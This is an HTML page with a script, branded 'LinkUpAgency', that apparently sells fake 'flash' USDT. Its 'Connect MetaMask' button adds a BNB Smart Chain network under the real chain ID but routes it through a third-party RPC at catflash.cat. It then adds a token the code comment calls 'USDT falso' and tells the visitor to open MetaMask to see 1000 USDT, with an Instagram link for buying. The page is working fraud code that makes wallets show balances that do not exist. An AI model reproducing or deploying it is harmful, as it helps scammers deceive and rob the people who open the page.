<body>
  <h1>USDT üí∏ con LinkUpAgency</h1>

  <button onclick="connect()">Connect MetaMask</button><br/>
  <button onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank')">Contactar o Comprar con LinkUp üîó</button>

  <script>
    async function connect() {
      if (!window.ethereum) {
        alert("Por favor instala MetaMask.");
        return;
      }

      try {
        // Conectar cuenta
        await ethereum.request({ method: 'eth_requestAccounts' });

        // Agregar red BNB Smart Chain de Catflash
        await ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'BNB Smart Chain Mainnet',
            rpcUrls: ['https://dataseed-binance.catflash.cat/'],
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18
            },
            blockExplorerUrls: ['https://bscscan.com']
          }]
        });

        // Agregar token USDT falso
        await ethereum.request({
          method: 'wallet_watchAsset',
          params: {
            type: 'ERC20',
            options: {
              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
              symbol: 'USDT',
              decimals: 6,
              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
            }
          }
        });

        alert("‚úÖ Conectado, red y token a√±adidos. Abre MetaMask para ver los 1000 USDT.");
      } catch (err) {
        console.error(err);
        alert("‚ùå Error al conectar MetaMask o a√±adir red/token.");
      }
    }
  </script>
